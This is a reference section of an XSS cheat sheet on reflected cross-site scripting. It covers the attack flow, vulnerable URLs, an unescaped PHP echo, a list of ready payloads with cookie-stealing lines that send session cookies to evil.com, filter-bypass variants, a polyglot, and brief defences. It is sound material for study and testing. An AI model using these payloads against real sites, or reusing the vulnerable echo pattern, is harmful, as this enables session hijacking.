
## 2. XSS Types

---

### 2.1 Reflected XSS

**Reflected XSS** occurs when malicious input is immediately "reflected" back by the server in its HTTP response — without being stored. The victim must be tricked into clicking a crafted link for the attack to execute.

> Also known as: **Non-Persistent XSS** or **Type-I XSS**

---

### 🧠 Logic & Mechanism

```
┌──────────────────────────────────────────────────────────────────────┐
│                     REFLECTED XSS — ATTACK FLOW                      │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. Attacker crafts a malicious URL containing a payload             │
│                                                                      │
│     https://site.com/search?q=<script>alert(1)</script>              │
│                                                                      │
│  2. Attacker sends the link to the victim                            │
│     (via email, SMS, social media, phishing page...)                 │
│                                                                      │
│  3. Victim clicks the link → Browser sends GET request to server     │
│                                                                      │
│  4. Server reflects the input back in the HTML response              │
│                                                                      │
│     <p>Search results for: <script>alert(1)</script></p>             │
│                                                                      │
│  5. Browser parses the HTML → Script executes immediately            │
│                                                                      │
│     💀 Cookies stolen / Session hijacked / Malware delivered         │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘

  [Attacker] ──(crafted URL)──► [Victim] ──(click)──► [Server]
                                                           │
                                          reflects payload │
                                                           ▼
                                                    [Victim Browser]
                                                    executes script
```

**Key characteristics:**
- Payload is **not stored** on the server
- Attack requires the victim to **click a link**
- Execution is **immediate** — one HTTP request/response cycle
- Common in: **search bars, error messages, login redirects, URL parameters**

---

### 🎯 Example Scenarios

#### Scenario 1 — Search Bar

```
Vulnerable URL:
  https://shop.com/search?q=shoes

Server-side (PHP):
```
```php
// ❌ VULNERABLE
$query = $_GET['q'];
echo "<p>Results for: $query</p>";
```
```
Attacker's payload:
  https://shop.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

Browser renders:
  <p>Results for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>

Result: Victim's session cookie is sent to attacker's server.
```

---

#### Scenario 2 — Error / 404 Page

```
Vulnerable URL:
  https://site.com/page-not-found?ref=<script>alert(1)</script>

Server reflects the "ref" parameter into the error page:
  <p>You were redirected from: <script>alert(1)</script></p>
```

---

#### Scenario 3 — Login Redirect Parameter

```
Vulnerable URL:
  https://site.com/login?next=<script>alert(document.cookie)</script>

After login, server redirects with:
  <meta http-equiv="refresh" content="0; url=<script>alert(document.cookie)</script>">
```

---

#### Scenario 4 — HTTP Header Reflection (User-Agent)

```http
GET /page HTTP/1.1
User-Agent: <script>alert(1)</script>

Server response:
  <p>Your browser: <script>alert(1)</script></p>
```

> ⚠️ This requires the server to render User-Agent in the HTML — seen in analytics dashboards, admin panels, logging UIs.

---

### 💣 Payloads

#### Basic / Proof of Concept
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
```

#### Cookie Stealing
```html
<script>document.location='https://evil.com/?c='+document.cookie</script>
<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>
<script>new Image().src='https://evil.com/?c='+document.cookie</script>
```

#### Session Hijacking via XHR
```html
<script>
var x = new XMLHttpRequest();
x.open('GET','https://evil.com/?session='+document.cookie);
x.send();
</script>
```

#### Event Handler (no `<script>` tag)
```html
<img src=x onerror=alert(document.cookie)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<a href="javascript:alert(1)">Click</a>
```

#### Filter Bypass — Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
```

#### Filter Bypass — Broken / Malformed Tags
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>alert(1)//<</script>
```

#### Filter Bypass — Encoding
```html
<!-- HTML Entity Encoding -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Double URL Encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

#### Filter Bypass — No Quotes / No Spaces
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

#### Polyglot (works across multiple contexts)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

### 🔎 Where to Test

```
High-value injection points for Reflected XSS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔍  ?q=        Search parameters
  ⚠️  ?error=    Error / message parameters
  🔀  ?next=     Redirect / return URL parameters
  🆔  ?id=       Resource ID parameters
  📋  ?name=     User input reflected in page
  🌐  Referer    HTTP header reflected in response
  🖥️  User-Agent HTTP header in admin/log panels
```

---

### 🛡️ Defense

```
✅  HTML-encode all output:   & → &amp;  < → &lt;  > → &gt;
✅  Use framework auto-escaping (Jinja2, Blade, Thymeleaf...)
✅  Validate and whitelist input on the server
✅  Set Content Security Policy (CSP) headers
✅  Use HttpOnly flag on session cookies
```

---

*XSS Cheat Sheet · Section 2.1 — Reflected XSS*  
*For educational purposes only*
